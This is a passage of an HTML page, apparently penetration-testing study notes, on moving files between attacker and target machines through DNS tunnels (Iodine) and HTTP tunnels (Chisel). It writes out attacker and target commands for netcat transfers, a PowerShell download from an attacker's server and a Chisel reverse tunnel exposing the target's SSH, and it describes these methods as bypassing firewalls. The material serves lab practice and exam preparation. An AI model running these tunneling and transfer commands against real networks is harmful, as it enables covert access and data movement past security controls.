+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="w">          </span>inet<span class="w"> </span>addr:10.0.0.2<span class="w">  </span>P-t-P:10.0.0.1<span class="w"> </span>Mask:255.255.255.0
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="w">          </span>...
+</code></pre></div>
+<hr />
+<h3 id="step-3-transfer-files-over-the-dns-tunnel"><strong>Step 3: Transfer Files Over the DNS Tunnel</strong></h3>
+<p>Now that the DNS tunnel is established, you can transfer files from the attacker machine to the target or vice versa.</p>
+<h3 id="31-on-the-attacker-machine"><strong>3.1 On the Attacker Machine</strong></h3>
+<p>You can use <code>scp</code> or other tools over the DNS tunnel to transfer files. Here’s an example of transferring a file using <code>scp</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>bash
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>Copy<span class="w"> </span>code
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>scp<span class="w"> </span>-P<span class="w"> </span><span class="m">22</span><span class="w"> </span>/path/to/localfile<span class="w"> </span>user@10.0.0.2:/path/to/remotefile
+</code></pre></div>
+<p>Here:</p>
+<ul>
+<li><code>10.0.0.2</code> is the virtual IP address of the target machine (inside the tunnel).</li>
+<li><code>/path/to/localfile</code> is the path of the file you want to transfer on your attacker machine.</li>
+<li><code>/path/to/remotefile</code> is the destination path on the target machine.</li>
+</ul>
+<hr />
+<h3 id="step-4-validate-file-transfer"><strong>Step 4: Validate File Transfer</strong></h3>
+<p>After transferring the file, you can verify the integrity of the file on both machines by running <code>md5sum</code>:</p>
+<h3 id="on-the-attacker-machine"><strong>On the Attacker Machine:</strong></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>bash
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>Copy<span class="w"> </span>code
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>md5sum<span class="w"> </span>/path/to/localfile
+</code></pre></div>
+<h3 id="on-the-target-machine"><strong>On the Target Machine:</strong></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>bash
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>Copy<span class="w"> </span>code
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>md5sum<span class="w"> </span>/path/to/remotefile
+</code></pre></div>
+<p>Both outputs should be identical, confirming that the file transfer was successful.</p>
+<hr />
+<h3 id="summary"><strong>Summary</strong></h3>
+<ol>
+<li><strong>Set up DNS tunneling server</strong> on the attacker machine using Iodine.</li>
+<li><strong>Configure DNS records</strong> for your domain to point to your attacker's public IP.</li>
+<li><strong>Connect to the DNS tunneling server</strong> from the target machine using Iodine as the client.</li>
+<li><strong>Use the virtual network interface</strong> (created via DNS tunneling) to transfer files or run commands.</li>
+</ol>
+<p>This method bypasses firewalls that block other traffic types but allow DNS, making it effective in environments with restricted outbound connections.</p>
+<h3 id="tools-for-dns-tunneling_1"><strong>Tools for DNS Tunneling</strong></h3>
+<ul>
+<li><strong>Iodine</strong>: A widely used tool for DNS tunneling.</li>
+<li><strong>Dnscat2</strong>: Another popular tool for tunneling data over DNS.</li>
+</ul>
+<hr />
+<h1 id="dns-tunneling-windows">DNS Tunneling Windows</h1>
+<p>If the <strong>target machine is a Windows system</strong>, you can still set up DNS tunneling, but the process differs since Windows doesn't natively support Linux packages like <code>iodine</code>. However, there are <strong>Windows alternatives</strong> for DNS tunneling that you can use to connect to an Iodine server. Here's how you can achieve this on a Windows target:</p>
+<hr />
+<h3 id="step-by-step-dns-tunneling-on-a-windows-target"><strong>Step-by-Step: DNS Tunneling on a Windows Target</strong></h3>
+<h3 id="step-1-use-a-windows-client-for-dns-tunneling"><strong>Step 1: Use a Windows Client for DNS Tunneling</strong></h3>
+<p>Since you can't directly install <code>iodine</code> on Windows, you'll need a Windows-compatible tool. Here are a couple of options:</p>
+<ol>
+<li><strong>Iodine for Windows (Portable)</strong>:<ul>
+<li>There's a <strong>Windows version</strong> of Iodine available as a portable executable.</li>
+<li>You can download it from trusted sources (e.g., <a href="https://github.com/yarrick/iodine/releases">here on GitHub</a>) or compile it yourself.</li>
+</ul>
+</li>
+<li><strong>DNSCat2</strong>:<ul>
+<li>An alternative tunneling tool that also works over DNS. It has a Windows client available.</li>
+<li>It can be downloaded from <a href="https://github.com/iagox86/dnscat2">GitHub DNSCat2 repository</a>.</li>
+</ul>
+</li>
+</ol>
+<p>For this guide, let's use <strong>Iodine for Windows</strong>.</p>
+<hr />
+<h3 id="step-2-download-and-set-up-iodine-on-windows"><strong>Step 2: Download and Set Up Iodine on Windows</strong></h3>
+<ol>
+<li>
+<p><strong>Download the Iodine Windows Client</strong>:</p>
+<ul>
+<li>Go to <a href="https://github.com/yarrick/iodine/releases">Iodine’s GitHub page</a>.</li>
+<li>Download the appropriate <code>.exe</code> file for your Windows version.</li>
+</ul>
+<p>Example: <code>iodine-win32-0.7.0.zip</code></p>
+</li>
+<li>
+<p><strong>Extract the Executable</strong>:</p>
+<ul>
+<li>Extract the downloaded <code>.zip</code> file. You should see the <code>iodine.exe</code> file.</li>
+</ul>
+</li>
+</ol>
+<hr />
+<h3 id="step-3-establish-the-dns-tunnel"><strong>Step 3: Establish the DNS Tunnel</strong></h3>
+<ol>
+<li>
+<p><strong>Run the Iodine Client on Windows</strong>:</p>
+<ul>
+<li>
+<p>Open <strong>Command Prompt</strong> (as Administrator) on the target Windows machine.</p>
+</li>
+<li>
+<p>Navigate to the folder where you extracted <code>iodine.exe</code>.</p>
+</li>
+<li>
+<p>Use the following command to establish the DNS tunnel with your attacker machine:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>iodine.exe<span class="w"> </span>-f<span class="w"> </span>&lt;your_public_ip&gt;<span class="w"> </span>tunnel.example.com
+</code></pre></div>
+</li>
+</ul>
+<p>Here:</p>
+<ul>
+<li><code>&lt;your_public_ip&gt;</code> is your attacker's public IP address (where the Iodine server is running).</li>
+<li><code>tunnel.example.com</code> is the DNS domain or subdomain pointing to your attacker’s IP (same as in the Linux example).<ol>
+<li><strong>Verify the Tunnel Interface</strong>: Once the DNS tunnel is established, you can check the network interfaces on the target Windows machine to see the virtual interface that gets created (like <code>dns0</code> in Linux). Run this in Command Prompt:</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>ipconfig<span class="w"> </span>/all
+</code></pre></div>
+<p>You should see a new interface with an IP address like <code>10.0.0.2</code> assigned (assuming your Iodine server on the attacker machine is set to <code>10.0.0.1</code>).</p>
+</li>
+</ol>
+<hr />
+<h3 id="step-4-transfer-files-over-the-dns-tunnel"><strong>Step 4: Transfer Files Over the DNS Tunnel</strong></h3>
+<p>Now that the DNS tunnel is active, you can use it to transfer files from your attacker machine to the Windows target. You can do this with standard tools like <strong>Netcat (nc)</strong> or <strong>PowerShell</strong>, or using the <strong>scp</strong> command if SSH is available.</p>
+<p>Here are two examples for file transfer:</p>
+<hr />
+<h3 id="option-1-transfer-files-using-netcat-nc"><strong>Option 1: Transfer Files Using Netcat (nc)</strong></h3>
+<p>You can use Netcat over the DNS tunnel to transfer files between the machines.</p>
+<ol>
+<li>
+<p><strong>On the Attacker Machine</strong>: Start a listener to send a file via Netcat:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&lt;<span class="w"> </span>/path/to/file
+</code></pre></div>
+</li>
+<li>
+<p><strong>On the Target (Windows) Machine</strong>: Use Netcat to receive the file:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>nc<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&gt;<span class="w"> </span>C:<span class="se">\\</span>path<span class="se">\\</span>to<span class="se">\\</span>outputfile
+</code></pre></div>
+<p>Here, <code>10.0.0.1</code> is the IP of the attacker’s machine through the DNS tunnel.</p>
+</li>
+</ol>
+<hr />
+<h3 id="option-2-transfer-files-using-powershell"><strong>Option 2: Transfer Files Using PowerShell</strong></h3>
+<p>You can use PowerShell to download files directly from your attacker machine over HTTP (assuming you have set up a Python HTTP server on your attacker machine, similar to the original example):</p>
+<ol>
+<li>
+<p><strong>On the Attacker Machine</strong>: Start a Python HTTP server:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>On the Target (Windows) Machine</strong>: Use PowerShell to download the file from the attacker machine:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="p">&lt;</span><span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span><span class="n">file</span><span class="p">.</span><span class="n">txt</span><span class="p">&gt;</span> <span class="n">-OutFile</span> <span class="n">C</span><span class="p">:\\</span><span class="n">path</span><span class="p">\\</span><span class="n">to</span><span class="p">\\</span><span class="n">outputfile</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
+<p>Again, <code>10.0.0.1</code> is the IP of the attacker’s machine in the DNS tunnel, and this will download <code>file.txt</code> from the attacker's HTTP server.</p>
+</li>
+</ol>
+<hr />
+<h3 id="step-5-validate-file-transfer"><strong>Step 5: Validate File Transfer</strong></h3>
+<p>After transferring files, you can verify their integrity by checking their hashes on both machines.</p>
+<ul>
+<li>
+<p><strong>On the Attacker Machine</strong>:</p>
+<p>```bash
+       md5sum /path/to/file</p>
+<p>```</p>
+</li>
+<li>
+<p><strong>On the Target (Windows) Machine</strong>: Use the <strong>CertUtil</strong> command to compute the file’s hash:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>certutil -hashfile C:\\path\\to\\outputfile MD5
+</code></pre></div>
+</li>
+</ul>
+<p>The output hashes should match, confirming the file was transferred correctly.</p>
+<hr />
+<h3 id="summary_1"><strong>Summary</strong></h3>
+<ul>
+<li><strong>Windows Target</strong>: Use the Iodine Windows client to establish a DNS tunnel with your attacker machine.</li>
+<li><strong>File Transfer</strong>: Use Netcat, PowerShell, or other tools to transfer files over the established DNS tunnel.</li>
+</ul>
+<p>This method bypasses traditional firewalls and security measures that block common file transfer methods but allow DNS traffic.</p>
+<hr />
+<h3 id="http-tunneling"><strong>HTTP Tunneling</strong></h3>
+<p>HTTP tunneling allows you to encapsulate non-HTTP traffic (like file transfers) inside HTTP requests. This is useful for environments where outbound web traffic (HTTP/HTTPS) is allowed, but other forms of traffic are blocked by firewalls.</p>
+<h3 id="steps-for-http-tunneling"><strong>Steps for HTTP Tunneling:</strong></h3>
+<ol>
+<li>
+<p><strong>Set up an HTTP tunneling tool on the attacker machine:</strong></p>
+<ul>
+<li>Use tools like <strong>HTTPTunnel</strong>, <strong>Chisel</strong>, or <strong>Tunna</strong> to create an HTTP tunnel server.</li>
+</ul>
+<p><strong>Example using Chisel:</strong></p>
+<ul>
+<li>
+<p>On the attacker's machine:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>chisel
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>./chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span><span class="w"> </span>--reverse
+</code></pre></div>
+<p>This starts a chisel server listening on port 8080, ready to accept incoming reverse tunnels.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Set up the HTTP tunnel client on the target machine:</strong></p>
+<ul>
+<li>
+<p>On the target machine (if you have shell access), set up the reverse connection to the attacker's server:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>bash
+<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>Copy<span class="w"> </span>code
+<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>./chisel<span class="w"> </span>client<span class="w"> </span>&lt;http://10.10.14.1:8080&gt;<span class="w"> </span>R:8081:localhost:22
+</code></pre></div>
+<p>This command creates a reverse tunnel through HTTP. The <code>R:8081:localhost:22</code> part means that port 8081 on the attacker's machine is forwarded to port 22 (SSH) on the target. You can change the port or service depending on what you need to tunnel.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Transfer files through the HTTP tunnel:</strong></p>
+<ul>
+<li>
+<p>Now that you have an HTTP tunnel, you can transfer files through the tunneled connection using standard tools:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>bash
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>Copy<span class="w"> </span>code
+<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>scp<span class="w"> </span>-P<span class="w"> </span><span class="m">8081</span><span class="w"> </span>user@localhost:/path/to/file<span class="w"> </span>.
+</code></pre></div>
+<p>The HTTP tunnel will forward the request to the target machine, allowing file transfer despite the firewall.</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="tools-for-http-tunneling"><strong>Tools for HTTP Tunneling:</strong></h3>
+<ul>
+<li><strong>HTTPTunnel</strong>: Allows you to tunnel any TCP connection through an HTTP proxy.</li>
+<li><strong>Chisel</strong>: Fast TCP/UDP tunneling over HTTP, great for tunneling services like SSH.</li>
+<li><strong>Tunna</strong>: A web application that creates a tunnel using HTTP requests.</li>
+</ul>
+<hr />
+<h3 id="when-to-use-dns-or-http-tunneling"><strong>When to Use DNS or HTTP Tunneling</strong></h3>
+<ul>
+<li><strong>DNS tunneling</strong>: Useful when DNS traffic is allowed but other outbound traffic is blocked. DNS queries are often overlooked by firewalls.</li>
+<li><strong>HTTP tunneling</strong>: Useful in environments where only web traffic is allowed. HTTP requests can encapsulate other protocols like SSH or SCP for file transfers.</li>
+</ul>
+<hr />
+<h3 id="study-tips"><strong>Study Tips</strong></h3>
+<ul>
+<li><strong>Practice using tunneling tools</strong> in different scenarios, especially in environments with restricted outbound traffic.</li>
+<li><strong>Set up a lab environment</strong> to practice file transfers over DNS or HTTP tunneling, and simulate firewall rules to understand how these methods can bypass them.</li>
+<li><strong>Master encoding techniques</strong> such as Base64 encoding and scripting the process of sending chunks of data, as they are essential when file transfer is blocked.</li>
+</ul>
+<hr />
+<h3 id="study-tip"><strong>Study Tip</strong></h3>
+<ul>
+<li>For real-world situations and exams, always be prepared to handle scenarios where direct file transfer methods are blocked. Practice breaking down encoded data into chunks or manually transferring data as a fallback method when copy-paste isn't available.</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h3 id="validating-file-transfers"><strong>Validating File Transfers</strong></h3>
+<p>After transferring a file, it’s important to verify its integrity and format.</p>
+<h3 id="1-using-the-file-command">1. <strong>Using the <code>file</code> Command</strong>:</h3>
+<p>Check the file type on the remote host to confirm it was transferred correctly.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>file<span class="w"> </span>output_file
+</code></pre></div>
+<h3 id="2-using-md5sum">2. <strong>Using <code>md5sum</code></strong>:</h3>
+<p>Compare the file’s MD5 hash on both machines to ensure it was transferred without corruption.</p>
+<ul>
+<li>
+<p>On the attack machine:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>md5sum<span class="w"> </span>filename
+</code></pre></div>
+</li>
+<li>
+<p>On the remote host:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>md5sum<span class="w"> </span>output_file
+</code></pre></div>
+</li>
+</ul>
+<p>If both MD5 hashes match, the file was transferred correctly.</p>
+<hr />
+<h3 id="study-tips_1"><strong>Study Tips</strong></h3>
+<ul>
+<li><strong>Practice</strong>: Set up a virtual lab environment with multiple virtual machines (VMs) and practice transferring files using the different methods mentioned.</li>
+<li><strong>Key Commands</strong>: Memorize key commands for each file transfer method. Knowing the options for <code>scp</code>, <code>wget</code>, <code>curl</code>, and <code>base64</code> will help you in both exams and real-world situations.</li>
+<li><strong>Verify Integrity</strong>: Always practice using <code>md5sum</code> or other hashing algorithms (like <code>sha256sum</code>) to ensure file integrity after transferring files.</li>
+<li><strong>Firewall Evasion</strong>: Focus on learning methods like <code>base64</code> encoding to bypass firewall restrictions, as this is often tested in exams and is practical in real-life scenarios.</li>
+<li><strong>Efficiency</strong>: Try to use the quickest and least intrusive method for file transfers based on the situation (e.g., <code>wget</code> or <code>curl</code> if ports are open).</li>
+</ul>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "content.code.annotation", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f1b6f286.min.js"></script>
+      
+    
+  </body>
+</html>
